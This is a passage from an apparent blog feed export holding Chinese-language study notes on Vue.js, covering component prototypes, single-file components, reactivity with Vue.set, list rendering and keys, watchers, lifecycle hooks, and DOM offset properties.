href="#四-一个重要的内置关系" class="headerlink" title="四 . 一个重要的内置关系"></a>四 . 一个重要的内置关系</h2><p>关于Vue和VueComponent的原型对象</p><p><img src="https://s2.loli.net/2022/03/28/9ebiBQltNqsoIjH.png" alt="Vue与VueComponent的内置关系.png"></p><p>原型对象的关系有点类似于java中的继承，函数中找原型对象是prototype而实例对象中是<code>_ _proto_ _</code>,此时Vue干了这么一件事情，将VueComponent的原型对象的<code>_ _proto_ _</code>属性指向了Vue的原型对象</p><p>这样子做有什么效果呢？其实是起到了一个保底的效果，比如Vue原型对象中有一个x，改变了x的值，我们需要的是vc也收到这个改变，如果vc的原型对象指向的是其他地方，vc就无法和vm的原型对象产生一个关联。<strong>以后vc查找需要的东西时，就会在vue的原型对象上多查找一下</strong></p><h2 id="五-单文件组件"><a href="#五-单文件组件" class="headerlink" title="五 . 单文件组件"></a>五 . 单文件组件</h2><p>我们先看看单文件组件的内容结构，这里推荐Vscode上面的一个插件（Vetur），方便我们.vue文件的书写</p><p><img src="https://s2.loli.net/2022/03/28/vKpaZ7AOjINPGqM.png" alt="单文件组件组成.png"></p><p>我们用到了Vue类型的后缀，（但是浏览器是无法直接识别.vue文件的，所以我们之后会学脚手架）School和Student都是其中的单文件组件，完成对应的功能，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>    name=<span class="hljs-string">&#x27;School&#x27;</span>,<br>    <span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">return</span>&#123;<br>                <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;swpu&#x27;</span>,<br>                <span class="hljs-attr">address</span>:<span class="hljs-string">&#x27;新都&#x27;</span><br>                &#125;<br>            &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而App.vue则是管理School和Student的组件，</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span></span><br><span class="xml">  </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="xml">    </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">School</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">School</span>&gt;</span></span><span class="xml"></span><br><span class="xml">    </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Student</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Student</span>&gt;</span></span><span class="xml"></span><br><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span><br><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="javascript"><span class="xml"><span class="hljs-keyword">import</span> School <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./School.vue&#x27;</span></span></span><br><span class="javascript"><span class="xml"><span class="hljs-keyword">import</span> Student <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./student.vue&#x27;</span></span></span><br><span class="javascript"><span class="xml"></span></span><br><span class="javascript"><span class="xml"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> </span></span><span class="xquery">&#123;</span><br><span class="xquery">   <span class="hljs-built_in"> name</span>=<span class="hljs-string">&#x27;App&#x27;</span>,</span><br><span class="xquery">    components: &#123; School, Student &#125;</span><span class="xml">,</span><br><span class="xml">&#125;</span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>在main中new vue 然后再把app组件写入，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> App <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span>;<br><br><span class="hljs-keyword">new</span> Vue(&#123;<br>    <span class="hljs-attr">el</span>: <span class="hljs-string">&quot;#root&quot;</span>,<br>    <span class="hljs-comment">//写入模板，在html文件中就可以不用再在div中加app了</span><br>    <span class="hljs-attr">template</span>:<span class="hljs-string">`</span><br><span class="hljs-string">    &lt;App&gt;&lt;/App&gt;</span><br><span class="hljs-string">    `</span>,<br>    <span class="hljs-attr">data</span>: &#123;<br>        <span class="hljs-attr">components</span>: &#123; App &#125;<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>最后在html文件中加入完成script引入等工作</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">App</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">App</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 一定在模板之后加入文件引入 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;../js/vue.min.js&#x27;</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;../js/main.js&#x27;</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可是这样子的文件是没有办法运行的</p><p><code>import App from &#39;./App.vue&#39;;</code>因为浏览器不认识这个语句，.vue文件那里是浏览器认识的类型呢？</p><p>所以我们马上进入强大的脚手架</p>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vue数据检测</title>
    <link href="/2022/03/05/vue%E6%95%B0%E6%8D%AE%E6%A3%80%E6%B5%8B/"/>
    <url>/2022/03/05/vue%E6%95%B0%E6%8D%AE%E6%A3%80%E6%B5%8B/</url>
    
    <content type="html"><![CDATA[<p>vue 的数据检测是vue中数据处理模式重要的一环，学习加深对于vue数据处理API的理解</p><span id="more"></span><h1 id="vue数据检测"><a href="#vue数据检测" class="headerlink" title="vue数据检测"></a>vue数据检测</h1><h2 id="1-Vue-set-or-vm-set"><a href="#1-Vue-set-or-vm-set" class="headerlink" title="1.Vue.set() or vm.$set()"></a>1.Vue.set() or vm.$set()</h2><p>这是一个关于数据检测的问题</p><p><img src="https://s2.loli.net/2022/03/14/RTVcury1m2jHPZn.png" alt="vue.set__页面1.png"></p><p>需求：在点击添加学生性别后加入学生性别这一行并显示为男</p><p>引入：Vue.set()函数，传入三个参数set(target,key,val)=&gt;target:传入数据的目标位置（不能是vm/vue和data）,key:属性名称,val:属性值` </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> vm = <span class="hljs-keyword">new</span> Vue(&#123;<br>           <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#app&#x27;</span>,<br>           <span class="hljs-attr">data</span>: &#123;<br>               <span class="hljs-attr">sname</span>: <span class="hljs-string">&#x27;swpu&#x27;</span>,<br>               <span class="hljs-attr">students</span>: &#123;<br>                   <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;tom&#x27;</span><br>               &#125;,<br>               <span class="hljs-attr">friends</span>: [<br>                   &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;jerry&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">18</span> &#125;,<br>                   &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;sherlock&quot;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">19</span> &#125;<br>               ]<br><br>           &#125;,<br>           <span class="hljs-attr">methods</span>: &#123;<br>               <span class="hljs-function"><span class="hljs-title">addsex</span>(<span class="hljs-params"></span>)</span> &#123;<span class="hljs-comment">//在data中加入数据set(target,key,val)</span><br>                   Vue.set(<span class="hljs-built_in">this</span>.students, <span class="hljs-string">&#x27;sex&#x27;</span>, <span class="hljs-string">&#x27;male&#x27;</span>)<span class="hljs-comment">//大写V</span><br>               &#125;<br>           &#125;<br>       &#125;);<br></code></pre></td></tr></table></figure><p>解决：设置一个student对象，在点击button时触发addsex()方法，加入Vue.set()函数，这时便可以在页面上显示学生性别</p><p>局限：由于目标位置不能是vm/vue和data，所以不能在data中直接加入数据，需要设置一个对象在对象下加入</p><h3 id="etc："><a href="#etc：" class="headerlink" title="etc："></a>etc：</h3><p>用一个vm去接Vue实例那么 ：Vue.set()=vm.$set()</p><h2 id="2-检测问题"><a href="#2-检测问题" class="headerlink" title="2.检测问题"></a>2.检测问题</h2><p>一.在click button时method加入这个语句<code>persons[0]=&#123; id: &#39;001&#39;, name: &#39;马老师&#39;, age: 50 &#125;</code> 效果如图</p><p><img src="https://s2.loli.net/2022/03/14/hLl2pETNGi9Cwfy.png" alt="question.png"></p><p>接到的vm中数据已经改变，但是vue中的数据还是原数据</p><p>二.在click之后先打开console查看vm，之后进入vue查看发现数据已经改变</p><p><img src="https://s2.loli.net/2022/03/14/hYlGcxFur4fKWJd.png" alt="q2.png"></p><p>但是页面显示还是原数据</p><h2 id="3-数据检测"><a href="#3-数据检测" class="headerlink" title="3.数据检测"></a>3.数据检测</h2><p>那么为什么会发生上面的情况呢？其实是因为Vue，不承认你的<code>persons[0]=&#123; id: &#39;001&#39;, name: &#39;马老师&#39;, age: 50 &#125;</code> 语句，这个语句实际上的调用 person[0]中的setter方法，但是我们看看person[0]</p><p><img src="https://s2.loli.net/2022/03/14/Iwy7hAgi5O2nKbE.png" alt="数组检测reason.png"></p><p>在这个数组hobby中没有为数组中元素设置的getter和setter方法，所以我们的语句无效</p><p>其实Vue承认数组改变的条件便是数组调用了这7个函数(push,pop,sort,shift(头删),unshift(头插),splice(替换),revrse(倒序),)</p><p>我们在使用这些函数的时候，Vue中的这个数据便会触发响应式，引起页面的变化</p><p><img src="https://s2.loli.net/2022/03/14/zinPvOaSy7eQFBV.png" alt="数组响应式.png"></p><h3 id="所以"><a href="#所以" class="headerlink" title="所以"></a>所以</h3><p>我们上面问题的代码应该是<code>person.splice(0,1,&#123; id: &#39;001&#39;, name: &#39;马老师&#39;, age: 50 &#125;)</code>或者使用<code>Vue.set(vm.person,0,&#123;id: &#39;001&#39;, name: &#39;马老师&#39;, age: 50 &#125;)</code>都可以实现数据的更新</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="https://s2.loli.net/2022/03/14/bgIKv4dZaTYwki1.png" alt="vue监测总结.png"></p><p>需要注意的两个点：</p><p>1.在数组是对象数组的情况下，单个数组元素里面的对象属性是自带get和set方法的</p><p>2.因为修改数组的响应式方法没有filter()，所以，如果想要实现过滤便要如下图进行操作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">filsmoke</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>​          <span class="hljs-comment">//因为数组操作没有filter，所以实现响应式就需要用原来的数据去接</span><br><br>​          <span class="hljs-built_in">this</span>.students.hobby=<span class="hljs-built_in">this</span>.students.hobby.filter(<span class="hljs-function">(<span class="hljs-params">h</span>)=&gt;</span>&#123;<br><br>​            <span class="hljs-keyword">return</span> h!==<span class="hljs-string">&#x27;抽烟&#x27;</span><br><br>​          &#125;)<br><br>​        &#125;<br></code></pre></td></tr></table></figure><p>filter()方法会形成一个新的数组，我们需要把这个数组赋值给原数组，这样才能改变原数组，另外根据需求需要把原来的数组进行备份</p><h2 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h2><p>最后解释我们常说的数据劫持：</p><p>数据劫持，便是将写入data的数据增加get和set方法，数据就拥有了自己的响应式，在读取数据（get）和修改数据（set）的时候都需要调用get和set方法“劫持”，根据get和set方法进行修改和读取并解析模板。生成虚拟dom…等vue内含的一切操作。</p>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>列表渲染</title>
    <link href="/2022/03/05/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/"/>
    <url>/2022/03/05/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/</url>
    
    <content type="html"><![CDATA[<h1 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染"></a>列表渲染</h1><span id="more"></span><h2 id="1-首先得到一个列表（v-for）"><a href="#1-首先得到一个列表（v-for）" class="headerlink" title="1.首先得到一个列表（v-for）"></a>1.首先得到一个列表（v-for）</h2><pre><code class="hljs">    &lt;ul&gt;        &lt;h2&gt;人员列表&lt;/h2&gt;        &lt;!-- v-for实现循环 在使用插值语法进行显示--&gt;        &lt;li v-for=&quot;p in persons&quot;&gt;&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125; &lt;/li&gt;    &lt;/ul&gt;&lt;/div&gt;&lt;script&gt;    Vue.config.devtools = true    Vue.config.productionTip = false    var vm = new Vue(&#123;        el: &#39;#app&#39;,        data: &#123;            // persons是一个数组,里面有很多对象            persons:[                &#123;id:&#39;001&#39;,name:&#39;张三&#39;,age:18&#125;,                &#123;id:&#39;002&#39;,name:&#39;李四&#39;,age:19&#125;,                &#123;id:&#39;003&#39;,name:&#39;王五&#39;,age:21&#125;            ]        &#125;    &#125;);</code></pre><p>v-for类似于一个for循环，而其中的in就是类似于for循环中的in 其中persons就是循环池子，而p就是循环的单个元素</p><pre><code class="hljs">    &lt;ul&gt;        &lt;h2&gt;人员列表&lt;/h2&gt;        &lt;!-- v-for实现循环 在使用插值语法进行显示--&gt;        &lt;li v-for=&quot;(p,index) in persons&quot; :key=&quot;p.id&quot;&gt;&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;--&#123;&#123;index&#125;&#125; &lt;/li&gt;        &lt;!-- index 是一个数字的标识，而key是选定唯一标志 --&gt;    &lt;/ul&gt;</code></pre><p>在加入index和:key之后便是一个真正完整的v-for循环 得到如下效果：</p><p><img src="https://s2.loli.net/2022/03/06/PToBhGiDf7vwyAs.png" alt="v-for.png"></p><h3 id="同时v-for也可以遍历对象"><a href="#同时v-for也可以遍历对象" class="headerlink" title="同时v-for也可以遍历对象"></a>同时v-for也可以遍历对象</h3><pre><code class="hljs">    &lt;ul&gt;        &lt;li v-for=&quot;(value,key) in car&quot; :key=&quot;key&quot;&gt;&#123;&#123;key&#125;&#125;--&#123;&#123;value&#125;&#125;&lt;/li&gt;        &lt;!-- 这里的key是car中的属性名 --&gt;    &lt;/ul&gt;</code></pre><p>此时的第二个属性和前面不同，其中的key是对象中的属性名</p><h3 id="遍历字符串"><a href="#遍历字符串" class="headerlink" title="遍历字符串"></a>遍历字符串</h3><pre><code class="hljs">    &lt;ul&gt;        &lt;li v-for=&quot;(char,index) in str&quot; :key=&quot;index&quot;&gt;&#123;&#123;char&#125;&#125;--&#123;&#123;index&#125;&#125;&lt;/li&gt;    &lt;/ul&gt;</code></pre><p>  与数组类似 </p><h2 id="2-key的作用"><a href="#2-key的作用" class="headerlink" title="2.key的作用"></a>2.<code>key</code>的作用</h2><p>在探讨key的作用之前，先用一个案例引出问题</p><p><img src="https://s2.loli.net/2022/03/06/uo3fmylnQEkH7TI.png" alt="key的作用2.png"></p><p>在一个v-for实现的遍历列表下在每个节点后加入一个input框，并写下各自对应的内容。现在我们首部插入一个新的节点，得到的dom页面变成了这样：</p><p><img src="https://s2.loli.net/2022/03/06/7xPe31kRXS2CAWc.png" alt="key的作用1.png"></p><p>不难发现，input框与li内容之间出现了错乱，而这种错乱出现的原因就是——vue虚拟dom的对比机制——说白了就是那个:key 后面的值是index引起的</p><p><img src="https://s2.loli.net/2022/03/06/AO7fzWIjJ1FHU8Y.png" alt="为什么index不能作为key.png"></p><p>虚拟dom的对比算法要<strong>根据key</strong>对比改变前的每一个节点，li中的文本内容很明显不同，于是<strong>生成新的节点，替代原来的节点，并赋上新值</strong> ，但是当对比input框时，由于<strong>填写的信息在虚拟dom中不可见</strong>，于是<strong>虚拟dom会把这两个当做一样的节点，不覆盖，直接使用</strong> 便导致了信息的错乱。</p><p>此外将key设置成index还有效率问题，<strong>因为对比失败会生成一个新的节点并插入，导致dom的节点被频繁操作</strong>，效率严重下降。</p><p>所以：</p><p><img src="https://s2.loli.net/2022/03/06/m4ZQeS6uX5GhdTv.png" alt="key的内部原理总结.png"></p><p>在key的选择上面：<strong>选择每条数据的唯一标识作为你的key</strong>，减少出错，提高效率。</p><h2 id="3-列表过滤"><a href="#3-列表过滤" class="headerlink" title="3.列表过滤"></a>3.列表过滤</h2><p><img src="https://s2.loli.net/2022/03/06/1xasWgFovytX2Si.png" alt="列表过滤.png"></p><p>列表过滤的两个需要注意的点便是：</p><p>1.需要设置一个filpersons，以免直接修改persons，保留persons的模板</p><p>2.需要immediate的配置项，而且keyword设置成空字符串，这样子便可以在加载时触发空字符串搜索，实现一开始显示全部搜索内容</p><h2 id="4-列表排序"><a href="#4-列表排序" class="headerlink" title="4.列表排序"></a>4.列表排序</h2><p><img src="https://s2.loli.net/2022/03/06/RA19c8TBg5YEn7P.png" alt="列表排序.png"></p><p>列表排序中的重点：</p><p>1.需要用一个定义的arr去接过滤出的数组</p><p>2.进行排序类型的判断</p><p>3.根据类型使用sort函数进行排序=&gt;(<code>sort(a,b)</code>,a-b便是升序，b-a便是降序)</p><p>4.最后返回这个函数</p><p>！！因为返回的参数比较多–<strong>牢记每个函数都需要一个返回值</strong></p>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深度监视</title>
    <link href="/2022/03/05/%E6%B7%B1%E5%BA%A6%E7%9B%91%E8%A7%86/"/>
    <url>/2022/03/05/%E6%B7%B1%E5%BA%A6%E7%9B%91%E8%A7%86/</url>
    
    <content type="html"><![CDATA[<h1 id="深度监视"><a href="#深度监视" class="headerlink" title="深度监视"></a>深度监视</h1><p><img src="https://s2.loli.net/2022/03/06/gjE7A89qlNfoMcO.png" alt="深度监视 numbers监视的是什么.png"></p><p>在watch中的numbers监测的并不会监测a和b的变化，监测的只是整个地址。如需监测a，b需要<code>&#39;numbers.a&#39;</code>再进行配置</p><p>于是出现了deep配置项-深度监视</p><p><img src="https://s2.loli.net/2022/03/06/QViEFOUHo6L8SgR.png" alt="深度监视.png"></p><p><code>deep:true</code>便是打开了深度监视</p><h3 id="注意：deep：监视多级结构中的全部属性"><a href="#注意：deep：监视多级结构中的全部属性" class="headerlink" title="注意：deep：监视多级结构中的全部属性"></a>注意：deep：监视多级结构中的全部属性</h3><h3 id="‘object-xxx’-监视多级结构中的某一个属性"><a href="#‘object-xxx’-监视多级结构中的某一个属性" class="headerlink" title="‘object.xxx’:监视多级结构中的某一个属性"></a>‘object.xxx’:监视多级结构中的某一个属性</h3><h1 id="简写形式"><a href="#简写形式" class="headerlink" title="简写形式"></a>简写形式</h1><p><img src="https://s2.loli.net/2022/03/06/ztP6hNqp9W3SFau.png" alt="监视属性简写.png"></p><p>在<strong>只有handler配置项</strong>的情况下，可以使用简写形式，<strong>类似于computed的简写</strong></p><h1 id="computed和Watch的区别"><a href="#computed和Watch的区别" class="headerlink" title="computed和Watch的区别"></a>computed和Watch的区别</h1><p><img src="https://s2.loli.net/2022/03/06/cqOP3wknXylgMRN.png" alt="watch于computed对比1.png"></p><p>区别分为下面两种情况</p><p>1.如果watch和computed都可以完成计算属性的需求，那么最好使用computed，因为写法简单</p><p>2.但是对于一些无法使用computed的情况，如下图</p><p><img src="https://s2.loli.net/2022/03/06/2iOSIAjaK6YhBmr.png" alt="watch和computed对比.png"></p><p>​    此时的fullname会报错，因为<code>return</code>中是setTimeout的返回值，而fullname当中的返回值没有了，这也说明fullname()是不支持异步计算的</p><p><strong>需要注意的是：这里的setTimeout需要写成箭头函数，如果是一般的函数this指向的是window，而箭头函数没有自己的this，往外一找，于是找到了fullname既是vm</strong></p><p><img src="https://s2.loli.net/2022/03/06/KbWymOLv6UGnguR.png" alt="wc区别小总结.png"></p>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>生命周期函数</title>
    <link href="/2022/03/05/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/"/>
    <url>/2022/03/05/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="生命周期函数"><a href="#生命周期函数" class="headerlink" title="生命周期函数"></a>生命周期函数</h1><h2 id="一-引入"><a href="#一-引入" class="headerlink" title="一 . 引入"></a>一 . 引入</h2><p>实现页面文字的闪动效果，需要改变文字透明度 =》设置一个interval 然后改变透明度。<em>因为是自动闪动所以我们不能使用点击按钮等等</em></p><p><img src="https://s2.loli.net/2022/03/14/2yYDwu6KeJMSvnq.png" alt="method写闪动.png"></p><p>现在我们看到的是用method里面的change写出的闪动，有明显的调用问题，因为修改<code>opacity</code>便会引起重新解析模板那么又会触发change函数,于是我们的interval将会爆炸式的增加</p><p>所以我们需要的是一个执行一次的回调函数</p><p>也就是我们的生命周期函数</p><p><img src="https://s2.loli.net/2022/03/14/26AjRvK3xPBTidz.png" alt="mounted写闪动.png"></p><p>生命周期函数有许多个，在不同的时期，Vue会调用不同的生命周期函数，mounted是挂载完成时调用（<em>也就是Vue加载完成时</em>），调用后修改模板不会引起再次调用，因为挂载时期已经过去</p><h2 id="分析各个函数的执行时期"><a href="#分析各个函数的执行时期" class="headerlink" title="分析各个函数的执行时期"></a>分析各个函数的执行时期</h2><h6 id="原图查看-https-cn-vuejs-org-images-lifecycle-png"><a href="#原图查看-https-cn-vuejs-org-images-lifecycle-png" class="headerlink" title="原图查看   https://cn.vuejs.org/images/lifecycle.png"></a>原图查看   <a href="https://cn.vuejs.org/images/lifecycle.png">https://cn.vuejs.org/images/lifecycle.png</a></h6><h3 id="create阶段（创建数据检测和数据代理）"><a href="#create阶段（创建数据检测和数据代理）" class="headerlink" title="create阶段（创建数据检测和数据代理）"></a>create阶段（创建数据检测和数据代理）</h3><p><img src="https://s2.loli.net/2022/03/14/lsKYhQuLbX5zeqv.png" alt="生命周期函数图示1.png"></p><p><code>beforeCreate</code>:此时Vue只有Event和Lifecycle，在此时输出Vue，会发现没有data数据也没有函数等等的引入，也就是你Vue中的数据都没有引入</p><p><code>created</code>:此时加入了数据检测和数据代理，你的方法和data中的数据已经加载进了Vue</p><p>判断框：<strong>此时开始解析模板，生成虚拟dom，但是还没有转换成真实dom插入页面</strong>。其中有一个template配置项，没有便会把整个包括写了el对应的标签都当做模板，有的话便只是把里面的代码当做模板</p><h3 id="mount阶段"><a href="#mount阶段" class="headerlink" title="mount阶段"></a>mount阶段</h3><p><img src="https://s2.loli.net/2022/03/14/U3JR5y2dLcp67Ah.png" alt="生命周期函数图示2.png"></p><p><code>beforeMount</code>:此时你可以拿到已经生成虚拟dom但是因为没有转成真实dom，页面也还没有经过编译，所以此时你对dom修改也不会有效</p><p><code>mounted</code>：在beforemount和mounted之间便是mount也就是 虚拟dom转换成了真实dom(还在vm.$el里面存了节点)，页面中呈现的也是经过Vue编译的dom，此时可以修改dom但是尽可能避免</p><h3 id="update阶段"><a href="#update阶段" class="headerlink" title="update阶段"></a>update阶段</h3><p><img src="https://s2.loli.net/2022/03/14/MUj3eGHgaFvuYRA.png" alt="生命周期函数更新.png"></p><p><code>beforeUpdate</code>:此时数据已经更新但是还没有转换到页面上，特点是数据与页面的不统一</p><p><code>updated</code>：更新完成，数据与页面统一显示</p><h3 id="destroy阶段"><a href="#destroy阶段" class="headerlink" title="destroy阶段"></a>destroy阶段</h3><p>最后便是Vue的销毁阶段，而要触发Vue的销毁，我们需要一个函数=&gt;<code>vm.$destroy()</code></p><p>它的作用是：1.完全销毁一个实例。清理它与其它实例的连接（与其他组件之间的链接），解绑它的全部指令及事件监听器（<strong>注意是自定                     义事件，原生dom事件是不会解除的</strong>）。</p><p>​                      2.触发 <code>beforeDestroy</code> 和 <code>destroyed</code> 的钩子。</p><p><img src="https://s2.loli.net/2022/03/14/WbiLAUxhj94dXaD.png" alt="生命周期函数销毁.png"></p><p><code>beforeDestroy</code>:在$destroy触发后进行，数据修改执行但是不显示在页面，所以通常用于关闭定时器等等收尾操作</p><p><code>destroyed</code>:注意绿框，在关闭监视器，事件监听器，子组件等后执行</p><h2 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h2><p>四对函数，代表了vm的四个时期，除了这四个函数本身，我们更需要注意的是，这四个函数之间的联系，每一对函数之间的联系即在他们中间发生了什么事。</p>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网页特效三——offset，client以及scroll</title>
    <link href="/2022/03/05/%E7%BD%91%E9%A1%B5%E7%89%B9%E6%95%88%E4%B8%89%E2%80%94%E2%80%94offset%EF%BC%8Cclient%E4%BB%A5%E5%8F%8Ascroll/"/>
    <url>/2022/03/05/%E7%BD%91%E9%A1%B5%E7%89%B9%E6%95%88%E4%B8%89%E2%80%94%E2%80%94offset%EF%BC%8Cclient%E4%BB%A5%E5%8F%8Ascroll/</url>
    
    <content type="html"><![CDATA[<h2 id="网页特效三——offset，client以及scroll"><a href="#网页特效三——offset，client以及scroll" class="headerlink" title="网页特效三——offset，client以及scroll"></a>网页特效三——offset，client以及scroll</h2><h2 id="一，offset系列："><a href="#一，offset系列：" class="headerlink" title="一，offset系列："></a>一，offset系列：</h2><h3 id="1-offset（元素偏移量）：offset的类型有offsetTop，offsetLeft，offsetWidth，offsetHeight和offsetParent几种，使用语法是element-offsetTop以获取-在有定位的父级元素下的距离。"><a href="#1-offset（元素偏移量）：offset的类型有offsetTop，offsetLeft，offsetWidth，offsetHeight和offsetParent几种，使用语法是element-offsetTop以获取-在有定位的父级元素下的距离。" class="headerlink" title="(1).offset（元素偏移量）：offset的类型有offsetTop，offsetLeft，offsetWidth，offsetHeight和offsetParent几种，使用语法是element.offsetTop以获取 在有定位的父级元素下的距离。"></a>(1).offset（元素偏移量）：offset的类型有offsetTop，offsetLeft，offsetWidth，offsetHeight和offsetParent几种，使用语法是<code>element.offsetTop</code>以获取 <em>在有定位的父级元素下的距离。</em></h3><h3 id="2-offset与style-xxx的区别：其他的区别不赘述主要是"><a href="#2-offset与style-xxx的区别：其他的区别不赘述主要是" class="headerlink" title="(2).offset与style.xxx的区别：其他的区别不赘述主要是"></a>(2).offset与style.xxx的区别：其他的区别不赘述主要是</h3><p>(1)：offset得到的是数值型数据，所以在使用数据时需要加上’px’.</p><p>(2) ：offset只能读取数据，没有赋值功能即：<code>var div.offsetTop=100+&#39;px&#39;;</code> 一般都是利用<code>element.style.top=100px;</code>来赋值。</p><p><img src="https://s2.loli.net/2022/03/06/g7jOAEQyXivze3J.png" alt="屏幕截图 2022-01-18 174349.png"></p><h4 id="3-offset应用举例"><a href="#3-offset应用举例" class="headerlink" title="(3).offset应用举例"></a>(3).offset应用举例</h4><p>offset的引用在目前学习看来是联合鼠标进行鼠标的定位（获取鼠标的坐标：<code>e.pagex/y</code>）通过div的offset读取坐标，可以得到两种重要数据</p><p>（1）鼠标在盒子中的相对位置</p><p>（2）盒子需要移动时，盒子的位置</p><p><em>这两个数据是计算 移动遮罩层 和 